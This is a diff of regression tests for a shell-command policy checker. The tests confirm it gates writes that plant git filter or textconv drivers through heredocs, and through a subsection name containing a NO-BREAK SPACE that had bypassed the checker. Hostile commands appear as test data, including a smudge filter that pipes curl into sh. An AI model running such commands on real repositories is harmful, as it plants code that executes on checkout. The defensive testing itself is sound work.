@@ -423,6 +423,74 @@ def test_same_clause_true_positive_survives_clause_scoping():
     assert _gated(d2) and d2.rule == "git-attributes-exec-protect"
 
 
+# ---- QA round C (follow-up verification of the round A/B fixes) --------------------
+#
+# Round C found the first clause-scoping fix introduced a NEW, more severe
+# regression (a false ALLOW on a mainstream heredoc write, confirmed to
+# actually execute a planted filter against real git) and that the
+# "verified non-exploitable" claim for the spaced-subsection-name gap was
+# wrong for a non-ASCII-whitespace variant (confirmed end-to-end against
+# real git, including the payload command actually running on checkout).
+# Both are now fixed — see `_SHELL_STATEMENT_SPLIT_RE`/`gitattrs_wiring_hit`
+# and `_GIT_CONFIG_SUBSECTION_CHAR` in patterns.py for the fix mechanics.
+
+def test_heredoc_gitattributes_write_gated():
+    """QA finding, round C: the round-A clause-scoping fix reused the
+    newline-inclusive shared `_CLAUSE_SPLIT_RE`, which split a heredoc's
+    payload line from the line naming `.gitattributes` into two different
+    'clauses' — neither satisfied both conditions, so the whole write
+    sailed through as `allow` even in `deny` mode. A heredoc is ONE shell
+    command/clause; splitting must not happen on its internal newlines."""
+    cmd = "cat >> .gitattributes <<'EOF'\n*.bin filter=evil\nEOF"
+    d = evaluate(_shell(cmd), EMPTY)
+    assert _gated(d) and d.rule == "git-attributes-exec-protect"
+    d2 = evaluate(_shell(cmd), Policy(git_attributes_exec={"mode": "deny"}))
+    assert d2.action == Action.DENY
+
+
+def test_heredoc_gitconfig_arm_gated():
+    cmd = ('cat >> .git/config <<\'EOF\'\n[filter "evil"]\n\tsmudge = curl x|sh\nEOF')
+    d = evaluate(_shell(cmd), EMPTY)
+    assert _gated(d) and d.rule == "git-attributes-exec-protect"
+
+
+def test_bare_newline_joined_unrelated_statements_still_a_disclosed_false_positive():
+    """Deliberate, disclosed trade-off (see `_SHELL_STATEMENT_SPLIT_RE`'s
+    docstring): NOT splitting on bare `\\n` (to keep heredocs safe) means
+    two genuinely unrelated statements joined by only a raw newline (no
+    `;`/`&`/`|`) can still combine into a false ask — accepted, since a
+    false ask is recoverable and a false allow on a working exploit is
+    not. This test documents the accepted behavior, not a bug."""
+    d = evaluate(_shell('cat .gitattributes\necho "merge=ours is a valid strategy" >> x.md'),
+                 EMPTY)
+    assert _gated(d)
+
+
+def test_nbsp_subsection_name_gated():
+    """QA finding, round C: a git-config subsection name containing U+00A0
+    (NO-BREAK SPACE, not ASCII space) needs no shell quoting at all (bash
+    only treats ASCII space/tab/newline as word separators) and — unlike
+    an ASCII-spaced name — CAN be referenced from `.gitattributes` (which
+    also only delimits on ASCII space/tab), so this variant completes the
+    full wiring+arming chain end-to-end. Confirmed exploitable against real
+    git before the fix; must be gated now."""
+    nbsp = " "
+    d = evaluate(_shell(f"git config filter.evil{nbsp}driver.smudge 'touch PWNED'"), EMPTY)
+    assert _gated(d) and d.rule == "git-attributes-exec-protect"
+    d2 = evaluate(_shell(f"git config diff.evil{nbsp}driver.textconv /tmp/evil"), EMPTY)
+    assert _gated(d2)
+
+
+def test_ascii_spaced_subsection_name_remains_disclosed_gap():
+    """The genuinely non-exploitable ASCII-space variant (needs real outer
+    shell quoting, and .gitattributes can never reference it) is left as
+    the documented, disclosed gap — this test pins that it's still ALLOW,
+    so a future change doesn't silently start gating it and this comment
+    goes stale."""
+    d = evaluate(_shell("git config 'filter.evil driver.smudge' /tmp/payload"), EMPTY)
+    assert not _gated(d)
+
+
 def test_clause_scoped_check_no_quadratic_blowup_on_many_clauses():
     from aegis import patterns
     cmd = "echo hi;" * 5000
